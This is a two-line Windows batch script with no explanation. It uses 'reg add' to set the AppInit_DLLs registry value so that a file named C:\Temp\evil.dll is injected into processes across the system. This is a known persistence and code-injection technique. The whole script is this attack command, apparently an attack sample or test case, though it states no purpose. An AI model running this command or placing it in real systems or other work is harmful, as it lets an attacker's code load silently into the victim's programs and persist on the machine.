@echo off
reg add "HKLM\Software\Wow6432Node\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d C:\Temp\evil.dll /f